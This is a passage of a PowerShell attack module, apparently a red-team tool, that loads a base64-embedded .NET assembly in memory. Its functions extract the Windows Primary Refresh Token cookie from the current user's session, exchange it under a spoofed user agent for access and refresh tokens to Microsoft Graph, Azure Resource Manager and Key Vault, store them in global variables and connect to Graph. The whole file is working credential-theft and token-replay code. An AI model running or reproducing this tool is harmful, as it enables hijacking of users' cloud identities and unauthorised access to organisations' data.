AAAAAAAAAAAAAABAAAAMAAAAVDYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"@
    $bytes = [Convert]::FromBase64String($encoded)
    return [Reflection.Assembly]::Load($bytes)
}

function script:Decode-JwtPayload {
    param([string]$Token)
    try {
        $parts   = $Token.Split(".")
        $payload = $parts[1]
        $pad     = 4 - ($payload.Length % 4)
        if ($pad -ne 4) { $payload += "=" * $pad }
        $payload = $payload.Replace("-", "+").Replace("_", "/")
        return [System.Text.Encoding]::UTF8.GetString(
            [System.Convert]::FromBase64String($payload)) | ConvertFrom-Json
    }
    catch { return $null }
}

function script:Get-AuthCodeFromPRT {
    param(
        [string]$Cookie,
        [string]$Tenant,
        [string]$ResourceUrl,
        [string]$ClientId,
        [string]$RedirectUri
    )

    $authorizeUrl = "https://login.microsoftonline.com/$Tenant/oauth2/authorize" +
        "?client_id=$ClientId" +
        "&response_type=code" +
        "&redirect_uri=$([Uri]::EscapeDataString($RedirectUri))" +
        "&resource=$([Uri]::EscapeDataString($ResourceUrl))" +
        "&prompt=none"

    Write-Host "[*] Hitting authorize endpoint..." -ForegroundColor Cyan

    $location = $null
    try {
        $req = [System.Net.HttpWebRequest]::Create($authorizeUrl)
        $req.Method            = "GET"
        $req.AllowAutoRedirect = $false
        $req.UserAgent         = "python-requests/2.28.0"
        $req.Headers.Add("Cookie", "x-ms-RefreshTokenCredential=$Cookie")
        $resp     = $req.GetResponse()
        $location = $resp.Headers["Location"]
        $resp.Close()
    }
    catch [System.Net.WebException] {
        $location = $_.Response.Headers["Location"]
        if (-not $location) { throw "Authorize request failed: $($_.Exception.Message)" }
    }

    if (-not $location) { throw "No redirect location - cookie may be expired" }
    Write-Host "[*] Redirect: $location" -ForegroundColor DarkGray

    if ($location -match "[?&]code=([^&]+)")  { return $matches[1] }
    if ($location -match "[?&]error=([^&]+)") {
        $desc = if ($location -match "[?&]error_description=([^&]+)") {
            [Uri]::UnescapeDataString($matches[1])
        } else { "" }
        throw "AAD error: $($matches[1]) - $desc"
    }

    throw "No code in redirect: $location"
}

function script:Get-TokenFromAuthCode {
    param(
        [string]$Code,
        [string]$Tenant,
        [string]$ResourceUrl,
        [string]$ClientId,
        [string]$RedirectUri
    )

    try {
        return Invoke-RestMethod `
            -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token" `
            -Method POST `
            -Headers @{ "User-Agent" = "python-requests/2.28.0" } `
            -Body @{
                grant_type   = "authorization_code"
                code         = $Code
                client_id    = $ClientId
                redirect_uri = $RedirectUri
                resource     = $ResourceUrl
            } -ErrorAction Stop
    }
    catch {
        $errBody = $_.ErrorDetails.Message
        if ($errBody) {
            try {
                $p = $errBody | ConvertFrom-Json
                throw "AAD error: $($p.error) - $($p.error_description)"
            }
            catch { throw "Token exchange failed: $errBody" }
        }
        throw "Token exchange failed: $($_.Exception.Message)"
    }
}

# -----------------------------------------------------------------------
# Public functions
# -----------------------------------------------------------------------

function Get-PRTCookie {
    <#
    .SYNOPSIS
        Extracts the PRT cookie (x-ms-RefreshTokenCredential) from the current session.
    .EXAMPLE
        $cookie = Get-PRTCookie
        $cookie = Get-PRTCookie -Nonce "abc123"
        $cookie = Get-PRTCookie -Tenant "contoso.onmicrosoft.com"
        $cookie = Get-PRTCookie -Legacy
    #>
    [CmdletBinding()]
    param(
        [string]$Nonce,
        [string]$Tenant = "common",
        [switch]$Legacy
    )

    Write-Host "[*] PID    : $([System.Diagnostics.Process]::GetCurrentProcess().Id)"
    Write-Host "[*] Thread : $([System.AppDomain]::GetCurrentThreadId())"
    Write-Host ""

    $asm         = script:Load-TokenHelperAssembly
    $bridgeType  = $asm.GetType("TokenHelper.Internal.NativeTokenBridge")
    $nonceHelper = $asm.GetType("TokenHelper.Internal.NonceHelper")

    if ($Legacy) {
        Write-Host "[!] Legacy mode - iat-based cookie, likely rejected by AAD`n"
        $uris = @($bridgeType::BuildUri($null))
    }
    elseif (-not $Nonce) {
        Write-Host "[*] Fetching nonce from AAD..."
        Write-Host "[*] Tenant : $Tenant`n"
        try   { $Nonce = $nonceHelper::FetchNonce($Tenant) }
        catch { Write-Host "[-] Nonce fetch failed: $_" -ForegroundColor Red; return $null }
        Write-Host "[+] Nonce  : $Nonce`n"
        $uris = @($bridgeType::BuildUri($Nonce))
    }
    else {
        Write-Host "[*] Using provided nonce: $Nonce`n"
        $uris = @($bridgeType::BuildUri($Nonce))
    }

    $prtCookie = $null

    foreach ($uri in $uris) {
        Write-Host "[*] URI : $uri`n"

        try   { $results = [System.Linq.Enumerable]::ToList($bridgeType::GetCookies($uri)) }
        catch { Write-Host "[-] GetCookies failed: $_" -ForegroundColor Red; continue }

        if ($results.Count -eq 0) {
            Write-Host "[!] No cookies returned`n"
            continue
        }

        foreach ($c in $results) {
            Write-Host "[*] Name      : $($c.Name)"
            Write-Host "[*] Flags     : $($c.Flags)"
            Write-Host "[*] Data      : $($c.Data)"
            Write-Host "[*] P3PHeader : $($c.P3PHeader)`n"

            if ($c.Name -eq "x-ms-RefreshTokenCredential") {
                $prtCookie = $c.Data
            }
        }
    }

    if (-not $prtCookie) {
        Write-Host "[-] x-ms-RefreshTokenCredential not found in results" -ForegroundColor Red
        return $null
    }

    Write-Host "[+] PRT cookie captured`n"
    return $prtCookie
}

function Invoke-PRTTokenExchange {
    <#
    .SYNOPSIS
        Exchanges a PRT cookie for an access token.
    .EXAMPLE
        Invoke-PRTTokenExchange -PrtCookie $cookie -TenantId "contoso.onmicrosoft.com"
        Invoke-PRTTokenExchange -PrtCookie $cookie -TenantId "contoso.onmicrosoft.com" -Resource azurerm
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)][string]$PrtCookie,
        [Parameter(Mandatory=$true)][string]$TenantId,
        [string]$Resource = "msgraph"
    )

    $resourceMap = @{
        "msgraph"  = "https://graph.microsoft.com/"
        "aadgraph" = "https://graph.windows.net/"
        "azurerm"  = "https://management.azure.com/"
        "keyvault" = "https://vault.azure.net/"
    }
    if ($resourceMap.ContainsKey($Resource)) { $Resource = $resourceMap[$Resource] }

    $clientId    = "1b730954-1685-4b74-9bfd-dac224a7b894"
    $redirectUri = "urn:ietf:wg:oauth:2.0:oob"

    Write-Host "[*] Resource : $Resource" -ForegroundColor Cyan
    Write-Host "[*] Tenant   : $TenantId" -ForegroundColor Cyan
    Write-Host ""

    try   { $authCode = script:Get-AuthCodeFromPRT -Cookie $PrtCookie -Tenant $TenantId -ResourceUrl $Resource -ClientId $clientId -RedirectUri $redirectUri }
    catch { Write-Host "[-] Auth code failed: $_" -ForegroundColor Red; return $null }

    Write-Host "[+] Auth code obtained" -ForegroundColor Green
    Write-Host "[*] Code : $($authCode.Substring(0, [Math]::Min(40, $authCode.Length)))...`n"

    try   { $tokenResponse = script:Get-TokenFromAuthCode -Code $authCode -Tenant $TenantId -ResourceUrl $Resource -ClientId $clientId -RedirectUri $redirectUri }
    catch { Write-Host "[-] Token exchange failed: $_" -ForegroundColor Red; return $null }

    if (-not $tokenResponse.access_token) {
        Write-Host "[-] No access token in response" -ForegroundColor Red
        return $null
    }

    $global:accessToken  = $tokenResponse.access_token
    $global:refreshToken = $tokenResponse.refresh_token
    $global:expiresOn    = (Get-Date).AddSeconds($tokenResponse.expires_in)

    Write-Host "[+] Access token obtained" -ForegroundColor Green
    Write-Host "[*] Expires in : $($tokenResponse.expires_in)s ($global:expiresOn)" -ForegroundColor DarkGray
    Write-Host "[*] Resource   : $($tokenResponse.resource)`n" -ForegroundColor DarkGray

    $claims = script:Decode-JwtPayload -Token $global:accessToken
    if ($claims) {
        Write-Host "[*] UPN       : $($claims.upn)"              -ForegroundColor DarkGray
        Write-Host "[*] AMR       : $($claims.amr -join ', ')"   -ForegroundColor DarkGray
        Write-Host "[*] Device ID : $($claims.deviceid)"         -ForegroundColor DarkGray
        Write-Host "[*] Tenant ID : $($claims.tid)`n"            -ForegroundColor DarkGray
    }

    Write-Host "[+] `$global:accessToken  set" -ForegroundColor Green
    Write-Host "[+] `$global:refreshToken set`n" -ForegroundColor Green

    if ($Resource -like "*graph.microsoft.com*") {
        try {
            Connect-MgGraph -AccessToken ($global:accessToken | ConvertTo-SecureString -AsPlainText -Force) | Out-Null
            Write-Host "[+] Connected to Microsoft Graph" -ForegroundColor Green
            Get-MgContext | Select-Object Account, TenantId, AppName, AuthType | Format-List
        }
        catch {
            Write-Host "[-] Connect-MgGraph failed: $_" -ForegroundColor Red
            Write-Host "[*] Use `$global:accessToken directly`n" -ForegroundColor DarkGray
        }
    }

    return $tokenResponse
}

function Invoke-PRTChain {
    <#
    .SYNOPSIS
        Full chain: PRT cookie extraction + token exchange in one call.
    .EXAMPLE
        Invoke-PRTChain -TenantId "contoso.onmicrosoft.com"
        Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Resource azurerm
        Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Nonce "abc123"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)][string]$TenantId,
        [string]$Resource = "msgraph",
        [string]$Nonce,
        [string]$Tenant   = "common",
        [switch]$Legacy
    )

    $cookieParams = @{ Tenant = $Tenant }
    if ($Nonce)  { $cookieParams.Nonce  = $Nonce }
    if ($Legacy) { $cookieParams.Legacy = $true  }

    $prtCookie = Get-PRTCookie @cookieParams
    if (-not $prtCookie) {
        Write-Host "[-] Aborting - no PRT cookie" -ForegroundColor Red
        return
    }

    Invoke-PRTTokenExchange -PrtCookie $prtCookie -TenantId $TenantId -Resource $Resource
}